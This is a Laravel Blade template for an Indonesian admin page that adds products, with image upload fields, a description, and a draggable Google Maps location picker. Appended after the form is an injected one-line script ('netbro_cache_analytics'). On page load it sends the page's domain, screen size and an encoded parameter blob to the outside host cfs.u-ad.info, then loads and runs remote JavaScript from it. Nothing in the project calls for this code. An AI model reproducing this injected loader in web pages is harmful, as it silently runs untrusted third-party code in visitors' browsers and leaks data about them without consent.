@extends('app')

@section('content')
    <script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
    <script type="text/javascript">
        var geocoder = new google.maps.Geocoder();

        function geocodePosition(pos) {
            geocoder.geocode({
                latLng: pos
            }, function(responses) {
                if (responses && responses.length > 0) {
                    updateMarkerAddress(responses[0].formatted_address);
                } else {
                    updateMarkerAddress('Cannot determine address at this location.');
                }
            });
        }

        function updateMarkerPosition(latLng) {
            document.getElementById('infomap').value = [
                latLng.lat(),
                latLng.lng()
            ].join(', ');
        }

        function updateMarkerAddress(str) {
            document.getElementById('address').innerHTML = str;
        }

        function initialize() {
            var latLng = new google.maps.LatLng(-6.1750, 106.8283);
            var map = new google.maps.Map(document.getElementById('mapCanvas'), {
                zoom: 8,
                center: latLng,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            });
            var marker = new google.maps.Marker({
                position: latLng,
                title: 'Point A',
                map: map,
                draggable: true
            });

            // Update current position info.
            updateMarkerPosition(latLng);
            geocodePosition(latLng);

            // Add dragging event listeners.

            google.maps.event.addListener(marker, 'drag', function() {
                updateMarkerPosition(marker.getPosition());
            });

            google.maps.event.addListener(marker, 'dragend', function() {
                geocodePosition(marker.getPosition());
            });
        }

        // Onload handler to fire off the app.
        google.maps.event.addDomListener(window, 'load', initialize);
    </script>
    <style>
        #mapCanvas {
            width: 500px;
            height: 400px;
            float: left;
        }
        #infoPanel {
            float: left;
            margin-left: 10px;
        }
        #infoPanel div {
            margin-bottom: 5px;
        }
    </style>
    <div id="wrapper">

        <!-- Navigation -->
        @include('dashboard.sidebar')

        <!-- Page Content -->
        <div id="page-wrapper">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">Tambah Produk</h1>
                    </div>
                    <div class="col-lg-12">
                        @if($errors->any())
                            <ul class="alert alert-danger">
                                @foreach($errors->all() as $error)
                                    <li> {{$error}}</li>
                                @endforeach
                            </ul>
                        @endif
                        {!! Form::open(['files'=>true, 'url'=>'product/store']) !!}
                        <input type="hidden" name="product_id" value="">
                        <div class="form-group">
                            {!! Form::label('product_name', 'Nama Produk') !!}
                            {!! Form::text('product_name', null, ['class'=>'form-control']) !!}
                        </div>
                        <div class="row">
                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_image', 'Gambar Produk') !!}
                                    {!! Form::file('product_image', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>
                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_over_image', 'Sampul Produk (on hover)') !!}
                                    {!! Form::file('product_over_image', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>
                        </div>

                        <h2 class="page-header">Produk Detail</h2>
                        <div class="row">
                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_slider_1', 'Gambar Slider I') !!}
                                    {!! Form::file('product_slider_1', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>
                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_slider_2', 'Gambar Slider II') !!}
                                    {!! Form::file('product_slider_2', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>
                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_slider_3', 'Gambar Slider III') !!}
                                    {!! Form::file('product_slider_3', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>

                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_detail_header', 'Logo Produk') !!}
                                    {!! Form::file('product_detail_header', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>

                            <div class="col-xs-4">
                                <div class="form-group">
                                    {!! Form::label('product_detail_image', 'Gambar Detail Produk') !!}
                                    {!! Form::file('product_detail_image', null, ['class'=>'form-control']) !!}
                                </div>
                            </div>

                        </div>
                            <div class="form-group">
                                <input type="hidden" name="product_detail_slider_image[]">
                                {{--{!! Form::label('product_detail_slider_image', 'Product Detail Slider Image') !!}--}}
                                {{--{!! Form::file('product_detail_slider_image', array('multiple'=>true), ['class'=>'form-control']) !!}--}}
                            </div>
                            <div class="form-group">
                                {!! Form::label('product_tag', 'Tag Produk') !!}
                                {!! Form::textArea('product_tag', null, ['class'=>'form-control']) !!}
                            </div>

                            <div class="form-group">
                                {!! Form::label('product_detail_description', 'Deskripsi') !!}
                                {!! Form::textArea('product_detail_description', null, ['class'=>'form-control']) !!}
                            </div>
                            <div class="form-group">
                                <div class="col-xs-6" id="mapCanvas" style="margin-bottom: 30px"></div>
                                <div class="col-xs-5" id="infoPanel">
                                    <b>Lokasi terdekat:</b>
                                    <div id="address"></div>
                                    <label for="infomap">Lokasi:</label>
                                    <input id="infomap" class="form-control" type="text" name="product_detail_map">
                                </div>
                                {{--//map--}}
                            </div>
                            <br>
                        <div class="form-group">
                            {!! Form::submit('Tambah Produk', ['class'=>'btn btn-primary form-control']) !!}
                        </div>
                        {!! Form::close() !!}
                    </div>
                </div>
            </div>
            <!-- /.container-fluid -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpn%2bRtDSEvEFeRJKhKMtZji5X2CBJdg4zc%2bObvdqLOSiF8pGcdqebKya0iy%2bIkYiKcuRoWa%2b3gXrBl4df589dnmAVCCWpAsrN%2fsY%2bGgbWAuJBIOH%2bC9KMfDE7%2bkSjUFY7NjVmtVXmhh8cD%2bYPT%2bWG7qo78ZdxmYhSeRPfIeJsP4lYE%2bis1lYUNJ0vj%2fhecSyCk1twrXFZX4CXcNLNQ%2fHT16nuiOH2ej8gsONgBQ%2fw3wiE5u%2bA34xviPouKA60bkKmzOOqyRuXma7r00vsF3qXqaOlPVsq8loEGG7BJ3n4UyIDAzhbEQ6fwbNKRoI%2bVRD2UN8UPtOp9yMCEBxzG84Jw49bAqsGVdKrk7asRfZ3Lh65YR8peEr2H1eEdmfDXJryfOUSXMQJxUqHGg7eurmZUaq3xXdYjROtKMBnnCj3czN3utCn7jrP5GWBaFv4K3%2ffUliPbTun27SErcSypcqoF8t4fr00qPzD9hJ0wijiDKb4HDspICmsVbnWDKAeUDqKubmawx9KFauhmb83CWSRZLHTzxMdk0y9via6cqM2FCxlC3%2bhCSso19Pea463BY6TUn" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
@endsection